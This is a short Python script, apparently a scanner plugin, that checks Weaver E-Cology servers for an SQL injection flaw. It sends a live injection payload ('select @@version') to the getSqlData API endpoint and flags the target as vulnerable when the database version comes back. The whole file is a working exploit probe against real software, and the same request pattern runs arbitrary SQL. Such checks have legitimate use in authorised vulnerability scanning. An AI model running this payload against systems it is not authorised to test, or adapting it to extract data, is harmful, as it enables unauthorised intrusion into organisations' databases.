import requests
import urllib

def verify(url):
    relsult = {
        'name': 'Weaver-E-Cology-getSqlData-sqli',
        'vulnerable': False,
        'url': url
    }
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    vurl = urllib.parse.urljoin(url, '/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version')
    try:
        rep = requests.get(vurl, headers=headers, timeout=timeout)
        if rep.status_code == 200 and 'Microsoft' in rep.text and 'status":true' in rep.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult
    except:
        return relsult